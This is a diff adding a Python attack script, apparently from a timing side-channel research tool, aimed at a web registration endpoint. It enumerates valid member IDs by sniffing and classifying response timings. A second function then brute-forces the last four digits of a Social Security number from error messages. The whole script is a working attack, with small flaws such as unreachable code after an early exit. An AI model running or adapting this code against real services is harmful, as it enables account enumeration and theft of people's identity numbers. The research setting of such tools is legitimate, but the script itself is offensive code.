@@ -1,0 +1,178 @@
+#!/usr/bin/env python3
+#-*- mode: Python;-*-
+
+import sys
+import os
+import time
+import random
+import tempfile
+import argparse
+import socket
+import json
+import functools
+try:
+    import requests
+except:
+    sys.stderr.write('ERROR: Could not import requests module.  Ensure it is installed.\n')
+    sys.stderr.write('       Under Debian, the package name is "python3-requests"\n.')
+    sys.exit(1)
+
+VERSION = "{DEVELOPMENT}"
+if VERSION == "{DEVELOPMENT}":
+    script_dir = '.'
+    try:
+        script_dir = os.path.dirname(os.path.realpath(__file__))
+    except:
+        try:
+            script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
+        except:
+            pass
+    sys.path.append("%s/../../trunk/lib" % script_dir)
+
+from nanownlib import *
+from nanownlib.train import *
+import nanownlib.storage
+
+
+parser = argparse.ArgumentParser(
+    description="")
+parser.add_argument('session_data', default=None,
+                    help='Database file storing session information')
+parser.add_argument('host', default=None,
+                    help='IP address or host name of server')
+parser.add_argument('port', nargs='?', type=int, default=8080,
+                    help='TCP port number of HTTP service (default: 8080)')
+options = parser.parse_args()
+
+
+hostname = options.host
+port = options.port
+protocol = 'http'
+
+
+def extractReportedRuntime(headers, body):
+    try:
+        if 'X-Response-Time' in headers:
+            t = headers['X-Response-Time'].split('ms')[0]
+            return int(float(t)*1000000)
+    except:
+        pass
+
+    return None
+
+
+def sendRequest(data=None):
+    method = 'POST'
+    path = '/jregistrate/register'
+    url = "%s://%s:%d%s" % (protocol,hostname,port,path)
+    headers = {"Content-Type":"application/x-www-form-urlencoded"}
+    body = (b'member_id='+data.encode('utf-8')+b'&last_four=1111&username=bob&password=1234&conf_pwd=4321')
+    req = requests.Request(method, url, headers=headers, data=body).prepare()
+
+    retry = True
+    while retry:
+        try:
+            session = requests.Session()
+            response = session.send(req, verify=False)
+            #print(repr(response.raw._original_response.local_address))
+            reported = extractReportedRuntime(response.headers, response.text)
+            retry = False
+        except Exception as e:
+            sys.stderr.write("ERROR: HTTP request problem: %s\n" % repr(e))
+            time.sleep(1.0)
+            sys.stderr.write("ERROR: retrying...\n")
+        #print(data.encode('utf-8'), reported)
+        
+    return {'userspace_rtt':response.elapsed.microseconds*1000,
+            'reported':reported,
+            'local_port':response.raw._original_response.local_address[1]}
+
+
+def fetch(probedata, data):
+    #   http://docs.python-requests.org/en/latest/api/#requests.Response
+    result = sendRequest(data)
+    result.update(probedata)
+    
+    return result
+
+
+def findMaxSampleID(db):
+    cursor = db.conn.cursor()
+    cursor.execute("SELECT max(sample) FROM probes")
+    return cursor.fetchone()[0]
+
+
+setCPUAffinity()
+setTCPTimestamps()
+host_ip = socket.gethostbyname(hostname) #XXX: what about multiple A records?
+db = nanownlib.storage.db(options.session_data)
+
+cases = {"invalid":"0012-9999"}
+guesses = [("0012-%d"%id) for id in range(0,9999) if id != 2019]
+random.shuffle(guesses)
+num_observations = 100
+trim = (0,0)
+classifier = "septasummary"
+params = {"distance": 25, "threshold": 40094.274}
+classifierTest = functools.partial(classifiers[classifier]['test'], params, True)
+
+
+sid = findMaxSampleID(db) + 1
+for guess in guesses:
+    print("Collecting samples for:", guess)
+    cases["valid"] = guess
+    stype = "attack_%s" % guess
+    sample_order = list(cases.items())
+
+    sniffer_fp = tempfile.NamedTemporaryFile('w+t')
+    sniffer = startSniffer(host_ip, port, sniffer_fp.name)
+    time.sleep(0.5) # ensure sniffer is fully ready and our process is migrated
+
+    for obs in range(num_observations):
+        random.shuffle(sample_order)
+        now = int(time.time()*1000000000)
+        
+        results = []
+        for i in range(len(sample_order)):
+            results.append(fetch({'sample':sid, 'test_case':sample_order[i][0],
+                                  'type':stype, 'tc_order':i, 'time_of_day':now},
+                                 sample_order[i][1]))
+        db.addProbes(results)
+        db.conn.commit()
+        sid += 1
+
+    time.sleep(2.0) # Give sniffer a chance to collect remaining packets
+    stopSniffer(sniffer)
+    associatePackets(sniffer_fp, db)
+    sniffer_fp.close()
+    num_probes = analyzeProbes(db, trim=trim)
+    print("num_probes: ", num_probes)
+
+    if classifierTest(db.subseries(stype, "valid")):
+        print("Found valid member_id: ", guess)
+        break
+
+
+def guessSSN(member_id, last_four):
+    method = 'POST'
+    path = '/jregistrate/register'
+    url = "%s://%s:%d%s" % (protocol,hostname,port,path)
+    headers = {"Content-Type":"application/x-www-form-urlencoded"}
+    body = (b'member_id='+member_id.encode('utf-8')+b'&last_four='+last_four.encode('utf-8')+b'&username=bob&password=1234&conf_pwd=4321')
+    req = requests.Request(method, url, headers=headers, data=body).prepare()
+    session = requests.Session()
+    response = session.send(req, verify=False)
+
+    if 'Bad password' in response.text:
+        return True
+    else:
+        return False
+
+    
+print(guessSSN('0012-5969', '4298'))
+sys.exit(0)
+
+for last_four in range(9999):
+    if guessSSN(guess, "%4d" % last_four):
+        print("Found valid SSN last four digits:", last_four)
+        break
